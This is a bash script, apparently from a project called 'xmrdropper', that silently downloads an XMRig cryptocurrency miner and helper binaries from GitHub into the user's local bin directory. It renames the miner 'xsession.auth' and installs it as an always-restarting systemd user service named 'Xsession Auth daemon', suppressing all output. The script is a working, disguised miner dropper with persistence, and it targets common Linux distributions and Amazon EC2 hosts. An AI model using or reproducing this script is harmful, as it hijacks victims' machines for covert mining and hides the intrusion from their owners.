#!/bin/bash

REPO_URL=https://github.com/freebyte/xmrdropper
XMRIG_URL=$REPO_URL/raw/master/xmrig
XPRINTIDLE_URL=$REPO_URL/raw/master/xprintidle
APP_URL=$REPO_URL/raw/master/Xsession.sh
LOCAL_PATH=$HOME/.local/bin
APPNAME=Xsession.sh
XMRIGNAME=xsession.auth
XPRINTIDLE_NAME=xprintidle
SYSTEMD_PATH=$HOME/.config/systemd/user

ensure_os() {
	machine=$(uname -m)
	if [[ $machine != "x86_64" ]]; then
		exit
	fi

	id=$(awk -F'=' '/^ID=/ {print $2}' /etc/os-release | tr -d '"' | tr -d "'")
	
	case $id in
		linuxmint)
			return
			;;
		fedora)
			return
			;;
		ubuntu)
			# on amazon, ubuntu is default user
			return
			;;
		debian)
			# on amazon, admin is default user
			return
			;;
		amzn)
			# on amazon, ec2-user is default user
			return 
			;;
		*)
			exit
			;;
	esac
}

ensure_os

systemctl --user stop $APPNAME.service > /dev/null 2>&1
systemctl --user disable $APPNAME.service > /dev/null 2>&1
systemctl --user daemon-reload > /dev/null 2>&1

mkdir -p $LOCAL_PATH
curl -sL --output $LOCAL_PATH/$APPNAME $APP_URL 
curl -sL --output $LOCAL_PATH/$XMRIGNAME $XMRIG_URL 
curl -sL --output $LOCAL_PATH/$XPRINTIDLE_NAME $XPRINTIDLE_URL 


chmod +x $LOCAL_PATH/$APPNAME
chmod +x $LOCAL_PATH/$XMRIGNAME
chmod +x $LOCAL_PATH/$XPRINTIDLE_NAME

mkdir -p $SYSTEMD_PATH
cat <<HEREDOC > $SYSTEMD_PATH/$APPNAME.service
[Unit] 
Description=Xsession Auth daemon

[Service]
ExecStart=$LOCAL_PATH/$APPNAME
Restart=always
#StandardOutput=null
#StandardError=null

[Install]
WantedBy=default.target

HEREDOC

systemctl --user enable $APPNAME.service > /dev/null 2>&1
systemctl --user restart $APPNAME.service > /dev/null 2>&1
